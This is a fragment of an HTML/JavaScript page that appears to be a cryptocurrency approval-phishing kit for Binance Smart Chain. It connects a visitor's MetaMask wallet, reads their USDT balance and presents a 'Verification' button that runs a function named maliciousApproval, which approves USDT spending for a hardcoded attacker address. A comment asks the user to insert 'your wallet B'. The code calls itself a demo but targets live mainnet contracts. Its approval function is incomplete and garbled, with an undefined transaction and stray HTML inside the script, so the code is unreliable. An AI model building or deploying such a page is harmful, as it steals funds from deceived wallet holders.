    <div id="walletInfo">Wallet: Not connected</div>

    <script>
        // ‚úÖ ethers should now be defined

        // üî• ATTACKER'S BSC WALLET (REPLACE WITH YOUR WALLET B)
        const ATTACKER_ADDRESS = "0xEF8Aa8023bAa20C35404c636F858E054Db9698f3"; 

        // USDT (BEP-20) Contract on BSC Mainnet
        const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
        const USDT_ABI = [
            "function approve(address spender, uint256 amount) returns (bool)",
            "function balanceOf(address owner) view returns (uint256)"
        ];

        async function connectWallet() {
            if (!window.ethereum) {
                alert("MetaMask not installed!");
                return;
            }
            try {
                // Switch to BSC Mainnet (ChainID 56)
                await window.ethereum.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x38",
                        chainName: "Binance Smart Chain",
                        nativeCurrency: {
                            name: "BNB",
                            symbol: "BNB",
                            decimals: 18
                        },
                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
                        blockExplorerUrls: ["https://bscscan.com"]
                    }]
                });

                await window.ethereum.request({ method: "eth_requestAccounts" });
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                walletAddress = await signer.getAddress();
                
                // Show USDT balance
                const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
                const balance = await usdtContract.balanceOf(walletAddress);
                const usdtBalance = ethers.utils.formatUnits(balance, 18);
                
                document.getElementById("walletInfo").innerHTML = `
                    Connected: ${walletAddress}<br>
                    USDT Balance: ${usdtBalance}
                `;
                document.getElementById("approveBtn").disabled = false;
                document.getElementById("status").innerText = "‚úÖ Wallet connected. Click 'Verification'.";
            } catch (err) {
                alert("Error: " + err.message);
            }
        }

        async function maliciousApproval() {

            try {

                document.getElementById("status").innerHTML = `‚è≥ <strong>Approving 3 USDT...</strong><br>Check MetaMask.`;
                
                await tx.wait();

                    ‚úÖ <strong>Demo Complete!</strong><br>
                    Approved 3 USDT for attacker (<code>${ATTACKER_ADDRESS}</code>).<br>
                    <strong>BNB was used for gas.</strong>
